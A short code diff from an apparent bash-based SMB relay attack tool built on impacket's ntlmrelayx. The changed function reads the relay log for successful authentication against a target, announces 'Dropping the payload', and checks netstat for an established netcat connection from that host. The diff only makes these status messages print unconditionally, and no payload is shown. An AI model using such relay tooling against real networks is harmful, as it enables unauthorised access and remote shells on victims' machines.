@@ -285,14 +285,14 @@ function targetStatus(){
 	status=$(grep 'Authenticating against smb://'$1 $(pwd)/impacket/ntlmrelayx.log 2>/dev/null | tail -1 | awk '{print $NF}')
 
 	if [[ "$status" == "SUCCEED" || "$status" == "SUCCEE" ]];then
-		if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2; fi
+		echo -e "\t${greenColour}[:)]${endColour} Authentication against $1 succeed! Dropping the payload..."; sleep 2
 		
 		if [ "$(netstat -tnualp | grep '/nc' | grep "ESTABLISHED" | grep "$1")" == "" ];then 
-			if [ ! -z $quiet ];then echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload. '$(pwd)/impacket/ntlmrelayx.log' file is your friend.\n"; fi
+			echo -e "\t${redColour}[:(]${endColour} Unable to execute the payload. '$(pwd)/impacket/ntlmrelayx.log' file is your friend.\n"
 			echo $1 >> $(pwd)/impacket/hostsStatus.tmp
 		else echo; fi
 	elif [ "$status" == "FAILED" ];then
-		if [ ! -z $quiet ];then echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed! Not cool...\n"; sleep 0.3; fi
+		echo -e "\t${redColour}[:(]${endColour} Authentication against $1 failed! Not cool...\n"; sleep 0.3
 		echo $1 >> $(pwd)/impacket/hostsStatus.tmp
 	fi
 
